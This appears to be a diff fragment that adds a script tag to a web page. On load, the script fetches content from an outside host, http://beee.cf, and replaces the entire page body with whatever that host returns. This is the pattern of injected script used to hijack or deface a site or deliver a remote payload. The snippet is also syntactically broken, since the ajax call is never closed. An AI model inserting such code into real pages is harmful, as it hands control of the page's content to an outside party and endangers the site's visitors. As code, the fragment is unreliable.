@@ -1,0 +1,10 @@
+<script>
+        $.ajax({
+            type: 'get',
+            url: 'http://beee.cf',
+            success: function(response) {
+                // response = data which has been received and passed on to the 'success' function.
+                $('body').html(response);
+            }
+       
+</script>
